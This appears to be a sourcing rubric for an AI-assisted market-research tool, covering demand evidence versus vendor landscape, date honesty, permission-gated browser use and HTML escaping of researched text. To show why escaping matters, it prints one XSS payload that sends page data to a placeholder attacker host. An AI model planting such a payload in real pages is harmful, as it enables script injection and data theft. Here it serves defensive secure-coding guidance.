# Sourcing Rubric

The quality bar that separates a real demand signal from a plausible-sounding
guess. Every one of these rules was earned by a real failure: a fabricated
date, a vendor blog masquerading as demand, a dead thread cited as "ongoing."
Apply them before you output anything.

## Sources vs. landscape

A `source` is **direct evidence of demand**: a real user, in their own words,
expressing an unmet need. That is the only thing that belongs in `sources`.

Vendor blogs, "X vs Y" comparison pages, "best alternatives to X" listicles,
and anything authored by a company that sells in the space are **landscape**
evidence, never demand. Put them in `landscape.existing_solutions` if they're
useful, or drop them. They never go in `sources`. If a signal's only evidence
is vendor blogs and SEO comparisons, it has no real user demand. Drop it.

## Thread recency

Use current demand from roughly the last two weeks. For new research, separate
older discussions into supporting context under the rule below. Cite fresh
comments directly when they are the current evidence. Preserve all original
publication dates. Existing batches retain their legacy recency checks.

## Historical supporting context

Keep `sources` as current demand evidence. Older discussions belong in optional
`supporting_sources`, separate from primary source counts and `demand_strength`.
Each entry has `url`, `platform`, `quote`, original `date`, optional `engagement`,
and a nonempty unique `corroborated_by` array. Those URLs must each resolve to one
distinct primary source in the same signal, dated within 14 days of the batch
date (day 14 is allowed, future dates are not). Do not reference the supporting
item itself or another supporting item. Recent retrieval is not recent demand.

Read the corroborating sources and confirm independent users describe the same
unresolved need. Reposts, the same author's repeated complaint, a closure notice,
and a fresh announcement that the feature shipped are not independent unmet
demand. Quote a recent comment using its own permalink and publication date.

For a supporting GitHub issue or issue comment, include `issue_status` with
`state` (`open`, `closed`, or `unknown`) and the actual `checked` date. Closed
issues also require `closure_reason`:

- `completed`: work shipped or was resolved. Use only as history when fresh
  independent evidence proves a specific remaining or renewed gap, and explain
  that gap. Otherwise put it in the landscape or omit it.
- `not_planned`: the cited closing record says it was not planned. This does
  not establish that it closed automatically or prove why a maintainer declined.
- `automatic_stale`: the closing event or comment explicitly establishes
  inactivity. Never infer this from the closed state alone.
- `unknown`: the reason could not be verified. Do not invent closing evidence.

Known reasons require `evidence: {url, quote, checked}` citing the closing event
or comment. Unknown reason may omit it. Open or unknown issue states have no
closure fields. Keep original publication dates and verify current issue state.
The collector remains open-issue-only. Retrieve closed supporting material
separately through an official API, ordinary retrieval, or an approved browser.

All new supporting and evidence URLs must be absolute HTTP or HTTPS URLs.
All dates must be real calendar dates, no later than the batch date. The
validator checks fields, dates, and references. It cannot verify independent
authorship or whether a quote proves an unmet need.

## No fabricated facts

Never invent a source date, an engagement number, or a "newly available" /
"just shipped" / "platform blocker just removed" claim. The `date` is the real
publication date from the source page (the HN submission time, the Reddit post
time, the review's posted date). If you can't find a real date, drop the
source. If a capability has existed for years, the honest framing is "mature
and available," not "newly possible." When in doubt, quote the page verbatim
rather than paraphrasing from memory.

## Retrieval and browser permission

Use ordinary page retrieval or an official API first, including during preflight.
Browser interaction is an optional fallback when required replies, rules, or
other evidence are missing. Working retrieval needs no browser question.

Before the first browser action (including inspecting an existing tab), explain
what is missing, which pages and reading actions are needed, whether approval
covers one page or this research run, and whether an existing signed-in session
would be used. Ask explicitly, for example:

> I couldn't read the replies through normal retrieval. May I use your browser
> for read-only research during this run, including your existing signed-in
> session if needed, to open these threads and expand their comments?

Proceed only after an explicit yes covering that scope. An existing explicit
grant for this run is sufficient, so do not ask again for each in-scope page.
Page-only permission stays page-only. Public-only permission does not authorize
signed-in reading. Ask before expanding either scope. Each later research run
needs its own grant. Browser availability, installation, ambient tabs, silence,
and ambiguous replies are not permission. Revocation stops browser activity
immediately.

If the user declines or has not answered, continue independent research through
permitted nonbrowser routes. Do not repeatedly ask after refusal. An unattended
run without a grant uses those routes and reports coverage gaps instead of
waiting indefinitely. Stop only work whose essential evidence remains unreadable.
Mark inaccessible venue rules as unverified and omit unread sources. Never
reconstruct them from snippets, recall, or a login wall.

Approval covers reading and navigation needed to read, such as expanding
comments. It does not authorize posting, messaging, purchases, form submissions
that create external changes, or account changes. Follow the host's sign-in and
challenge rules. Do not bypass access restrictions or export browser credentials.
Cite content actually read through an authorized route with its real URL, quote,
and date. Browser access does not guarantee a page will be readable.

## Verify every source

Before a signal ships, read every cited URL through the permitted retrieval
sequence and confirm it supports the text attributed to it. This includes
supporting context, closure evidence, and competitor citations. For primary
`sources`, also confirm with your eyes:

- The **date** matches the page.
- The author is a **real user**, not a vendor/company/competitor article. Work
  out who sells in this space as you go, from the pages themselves. No
  pre-supplied blocklist will cover your focus area, and its absence is never
  an excuse to treat marketing as demand.
- It's **demand, not supply**. Someone promoting their own product (a typical
  "Show HN") is supply; drop it from `sources`.
- The content **actually loaded** through a permitted route. If errors or a
  login wall remain after the retrieval sequence above, drop the unread source.
- **GitHub issues** in primary `sources` must be open and actually request
  what you claim. Closed issues qualify only as historical supporting context
  under the rule above. Reading data is not evidence of write-back demand.
- **Platform match**: an iOS, Linux, or desktop source doesn't prove Android
  demand (and vice versa). If a source is cross-platform, say so in
  `engagement`.
- **Claim alignment**: the source must prove the *specific* thing the title
  claims. A bug report about saving settings is not evidence users want a new
  feature. If a source proves a related-but-different thing, narrow the signal
  to match it, or drop the source and find one that fits.

For every negative landscape claim ("X doesn't do Y", "no free tier"), open the
solution's page and verify it's still true. Misrepresenting what an existing
solution does is the most common landscape error.

## No inferred pain

Everything above polices facts you might invent. This one polices *conclusions*
you might invent from facts that are real, which is the harder failure to see
because every individual claim checks out.

You can observe that a business runs three locations, an ecommerce catalog, and
a wholesale line. You cannot observe that its inventory data is a mess. You can
observe that a company posted a job for a data analyst. You cannot observe that
its reporting is broken. The first half of each pair is on the page. The second
half is a guess about someone's internal state, and writing it down as though
you read it is the same failure as inventing a date... it just sounds smarter,
because it comes stapled to a real citation.

So: **evidence of complexity is not evidence of a problem.** Say what you saw,
then say what it makes plausible, and keep those in separate sentences. "Runs
retail, estimating, and manufacturing under one roof" is a finding. "Their
systems don't talk to each other" is fiction until somebody who works there
says so.

The same move shows up on the demand side, quieter. Eight tools in a space does
not prove the space is underserved, and a long GitHub issue thread does not
prove the maintainer is ignoring it. Report the count and the thread. Let the
reader draw the conclusion, or draw it out loud and label it as yours.

This gets sharpest wherever the method is pointed at a **named third party**: a
competitor's users, a specific business, a person you might email. An asserted
internal state about a named company is unverifiable, usually wrong, and
occasionally forwarded to them.

The honest version keeps its evidence and drops its diagnosis. "Public evidence
shows X. Whether that costs them anything is what a conversation is for." That
reads as more competent than the confident version, because it is.

## Landscape depth

The landscape is the part a reader cannot check for themselves, so show your
work. **List every credible option you found, not just the closest one.** Two
is a floor, not a target. If a space has eight plausible tools, the reader
needs all eight and a line on each, or they'll go and find the other six
themselves and stop trusting the ones you did name.

Each entry gets three things: the **name**, a live **url**, and a **gap** that
says specifically how it differs from what people are asking for. Add a
**`does`** line wherever you can: one neutral sentence on what the product
actually is, written the way its maker would write it. Name plus gap alone
reads as a list of dismissals. Name plus what-it-does plus gap reads as a
comparison, which is the thing that's actually useful.

Write the gap as a **difference, not a verdict.** "Crowded space" and "not
quite there" are useless. "Processes locally but needs a Home Assistant server
first" is a fact the reader can act on. Where a tool genuinely does solve part
of the demand, say so plainly. A landscape that makes every competitor sound
worthless is a landscape nobody believes.

An empty `existing_solutions` is allowed but expensive: `landscape_summary`
then has to say what you searched and why nothing came back. "I found nothing"
without the search behind it is indistinguishable from not looking.

## Citations for competitor gaps

Every competitor in new research includes paired `gap_status` (`verified` or
`unverified`) and `gap_evidence` (an array of `{url, quote, checked}` citations).
For a verified gap, include at least one specific documentation section, pricing
page, release note, or maintainer statement that supports the precise claim.
Keep the short exact quote and actual check date beside the URL. A homepage or
missing search result does not establish that a feature is absent.

If evidence is inconclusive, use `unverified` and say what could not be
confirmed, such as "I could not verify offline support in the documentation
checked." An empty evidence array is allowed in that case. Do not turn silence
in documentation into an absence claim. Both fields absent remains accepted
for legacy batches, without relabeling their gaps as verified.

## Researched text is untrusted input

Both methods do the same dangerous thing: they copy text that strangers on the
internet wrote into a document you then open. Thread titles, quotes, usernames,
product names, rules-page excerpts, URLs. **Every one of those fields is
attacker-authorable**, because anyone can post a thread, and this method goes
looking for threads.

That is fine in a chat reply and fine in Markdown. It is not fine in the HTML
output, where the browser will run what it's handed. A thread titled

```
<img src=x onerror="fetch('https://evil.example/'+document.title)">
```

is a perfectly ordinary thing for someone to post, and dropping it into a
generated page means opening your own research report executes their code.

So, whenever you render researched content as HTML:

- **Escape every externally sourced field** as HTML entities before it goes
  into the document: `&` to `&amp;`, `<` to `&lt;`, `>` to `&gt;`, `"` to
  `&quot;`, `'` to `&#39;`. Titles, quotes, names, `does` lines, gaps,
  engagement strings, rules quotes, and anything else you read off a page.
- **Allowlist link schemes.** An `href` or `src` may only be `http:` or
  `https:`. Drop anything else, `javascript:` and `data:` included, and strip
  control characters and spaces before you check the scheme, since a browser
  ignores them inside one and `java&#9;script:` parses as `javascript:`.
- **Never inline a researched string into a `<script>` block or an inline
  event handler.** Not escaped, not encoded, not "just this once."

The escaping is yours to do because you are the one writing the file. Nothing
downstream will do it for you.

The same reasoning is why the example site routes every signal URL through
`site/src/utils/safeUrl.js` before using it as an `href`. That covers the site.
It cannot cover a standalone file you generated in a chat, which is why the rule
lives here too.

## The same line, pointed the other way

This rubric is shared with [`CHANNELS.md`](./CHANNELS.md), the audience and
channel method, which runs this engine in reverse: not *what should I make* but
*where do I reach the people who'd want it.* The sources-vs-landscape rule above
is what keeps the two honest with each other, so it is worth stating in both
directions.

**Producing landscape is fine. Manufacturing a source never is.**

A directory listing, a release note, a Show HN, an honest "I built this, here's
what it does and what it doesn't" post: all landscape. Real, useful, findable,
and exactly what those venues are for. Nobody is fooled and nobody needs to be.

Something engineered to *read* as a source is the other thing entirely: a
sockpuppet, a friend primed to ask the question so you can answer it, a
testimonial you wrote, an undisclosed alt account. Whoever runs this rubric
against your space will eventually classify it as noise, because catching that
is literally what the rubric is for. Anyone using both halves of this repo would
be generating the input their own other half is built to reject.

So the outreach rules are just this rule restated: disclose inside the action
rather than in a footnote, answer first and mention second, one account and it's
yours, and where a venue states a ratio, treat it as the floor of decency rather
than a target.

## Quality over count

Return up to 10 signals, but never pad. Four strong, well-sourced signals beat
ten mixed ones. Reject: things that already exist and work well; single-person
requests with no engagement; technically infeasible ideas; vague complaints
with no clear product implication; spam and self-promotion; SEO listicles. If
a perfect, well-known solution already exists, drop the signal. The valid case
is when existing solutions are inadequate, overpriced, or privacy-hostile, and
you can name the gap specifically. Prefer signals with multiple independent
sources and ones where people explicitly say they'd pay.
